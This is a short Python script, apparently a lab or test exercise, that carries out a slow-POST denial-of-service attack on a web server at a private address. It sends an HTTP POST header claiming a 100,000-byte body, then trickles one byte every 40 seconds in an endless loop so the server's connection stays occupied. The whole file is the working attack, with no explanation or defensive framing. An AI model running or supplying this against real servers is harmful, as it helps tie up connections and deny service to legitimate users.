import socket
import time

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.3.102", 80))

requestMessage = "POST / HTTP/1.1\r\n" + "Host: 192.168.3.102\r\n" + \
                 "Content-Type: text/html\r\n" + "Content-Length: 100000\r\n" + \
                 "\r\n" + "A"
sock.send(requestMessage.encode())

connectMessage = "A"

while 1:
    sock.send(connectMessage.encode())
    time.sleep(40)

sock.close()
